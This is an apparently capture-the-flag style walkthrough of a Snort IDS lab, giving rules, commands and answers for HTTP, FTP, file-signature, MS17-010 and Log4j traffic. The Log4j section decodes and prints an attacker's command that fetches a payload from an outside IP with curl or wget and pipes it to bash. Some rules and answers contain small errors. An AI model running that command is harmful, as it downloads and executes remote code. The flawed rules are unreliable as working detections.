> Writing IDS Rules (HTTP)

`Write a rule to detect all TCP packets from or to port 80.  
`What is the number of detected packets you got?`

```
alert tcp any any <> any 80 (msg:"traffic port 80"; sid:100001; rev:;)
snort -c local.rules -A full -l . -r mx-3.pcap
164
```

`What is the destination address of packet 63?`

```
snort -r snort.log -n 63
216.239.59.99
```

` What is the ACK number of packet 64?`

```
snort -r snort.log -n 63
0x2E6B5384
```

`What is the SEQ number of packet 62?`

```
snort -r snort.log -n 64
0x36C21E28
```

`What is the TTL of packet 65?`

```
snort -r snort.log -n 65
128
```

`What is the source IP of packet 65?`

```
145.254.160.237
```

`What is the source port of packet 65?`

```
3372
```

> Writing IDS Rules (FTP)

`Write a single rule to detect "all TCP port 21"  traffic in the given pcap.`  
`What is the number of detected packets?`

```
alert tcp any any <> any 21 (msg:"TRaffic on port 21"; sid:100001; rev:1;)
snort -c local.rules -A full -l . -r ftp-png-gif.pcap
snort -r snort.log
307
```

`What is the FTP service name?`

```
snort -r snort.log -X -n 10
Microsoft FTP Service
```

`Write a rule to detect failed FTP login attempts in the given pcap.`
`What is the number of detected packets?`

```
alert any any <> any 21 (msg:"login attempt failed"; content:"503" sid:100001; rev:1;)
snort -c local.rules -A full -l . -r ftp-png-gif.pcap
41
```

`Write a rule to detect successful FTP logins in the given pcap.`
`What is the number of detected packets?`

```
alert tcp any any <> any 21 (msg:"login attempt failed"; content:"230"; sid:100001; rev:1;)
snort -c local.rules -A full -l . -r ftp-png-gif.pcap
1
```

`Write a rule to detect FTP login attempts with a valid username but no password entered yet.`
`Write a rule to detect FTP login attempts with a valid username but no password entered yet.`

```
alert tcp any any <> any 21 (msg:"missing password"; content:"331";  sid:100001; rev:1;)
snort -c local.rules -A full -l . -r ftp-png-gif.pcap
42
```

`Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.`
`What is the number of detected packets?`


```
alert tcp any any <> any 21 (msg:"missing password"; content:"331"; content:"Administrator"; sid:100001; rev:1;)
snort -c local.rules -A full -l . -r ftp-png-gif.pcap
7
```

> Writing IDS Rules (PNG)

> [!hint] File signatures
> [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

`Write a rule to detect the PNG file in the given pcap.`
`Investigate the logs and identify the software name embedded in the packet.`

```
alert tcp any any <> any any (msg:"PNG file"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:100001; rev:1;)
snort -r snort.log -X
Adobe ImageReady
```

`Write a rule to detect the GIF file in the given pcap.`
`Investigate the logs and identify the image format embedded in the packet.`

```
alert tcp any any <> any any (msg:"GIF file"; content:"|47 49 46 38 39 61|"; sid:100001; rev:1;)
snort -r snort.log -X
GIF89a
```

> Writing IDS Rules (Torrent Metafile)

`Write a rule to detect the torrent metafile in the given pcap.`
` What is the number of detected packets?`

```
alert tcp any any <> any any (msg:"Torrent Metafile"; content:"torrent"; sid:100001; rev:1;)
snort -r snort.log -X
2
```

`What is the name of the torrent application?`

```
Bittorrent
```

`What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?`

```
application/x-bittorrent
```

`What is the hostname of the torrent metafile?`

```
tracker2.torrentbox.com
```

> Troubleshooting Rule Syntax Errors

You can test each ruleset with the following command structure:
sudo snort -c local-X.rules -r mx-1.pcap -A console
`

`Fix the syntax error in local-1.rules file and make it work smoothly.`
`What is the number of the detected packets?`

```
alert tcp any 3372 -> any any (msg:"Troubleshooting 1"; sid:1000001; rev:1;)
16
```

`Fix the syntax error in local-2.rules file and make it work smoothly.`
`What is the number of the detected packets?`

```
alert icmp any any -> any any (msg:"Troubleshooting 2"; sid:1000001; rev:1;)
68
```

`Fix the syntax error in local-3.rules file and make it work smoothly.`
`What is the number of the detected packets?`

```
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any [80,443] (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
87
```

`Fix the syntax error in local-4.rules file and make it work smoothly.`
`What is the number of the detected packets?`

```
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
90
```

`Fix the syntax error in local-4.rules file and make it work smoothly.`
`What is the number of the detected packets?`

```
alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any -> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)
155
```

`Fix the syntax error in local-4.rules file and make it work smoothly.`
`What is the number of the detected packets?`


```
alert tcp any any <> any 80  (msg: "GET Request Found"; content:"GET"; sid:100001; rev:1;)
2
```

`Fix the syntax error in local-4.rules file and make it work smoothly.`
`What is the name of the required option:`

```
alert tcp any any <> any 80  (msg:"HTML Content"; content:"|2E 68 74 6D 6C|"; sid:100001; rev:1;)
msg
```

> Using External Rules (MS17-010)

`Use the given rule file (local.rules) to investigate the ms1710 exploitation.`
`What is the number of detected packets?`

```
snort -c local.rules -A full -l . -r ms-17-010.pcap
25154
```

`Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.`
`What is the number of detected packets?`

```
alert tcp any any <> any any (msg:"Payload detected"; content:"IPC$"; sid:100001; rev:1;)
12
```

`What is the requested path?`

```
\\192.168.116.138\IPC$
```

`What is the CVSS v2 score of the MS17-010 vulnerability?`

```
9.3
```

> Using External Rules (Log4j)

`Use the given rule file (local.rules) to investigate the log4j exploitation.`
`What is the number of detected packets?`

```
snort -c local.rules -A full -l . -r log4j.pcap
26
```

`How many rules were triggered?.`

```
cat alert | grep Exploit
4
```

`What are the first six digits of the triggered rule sids?`

```
210037
```

`Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.`
`What is the number of detected packets?`

```
alert tcp any any <> any any (msg:"Found packet"; dsize:770<>855; sid:100001; rev:1;)
41
```

`What is the name of the used encoding algorithm?`

```
Bas64
```

`What is the IP ID of the corresponding packet?`

```
62808
```

`Decode the encoded command.`
`What is the attacker's command?`

```
KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

`What is the CVSS v2 score of the Log4j vulnerability?`

```
9.3
```
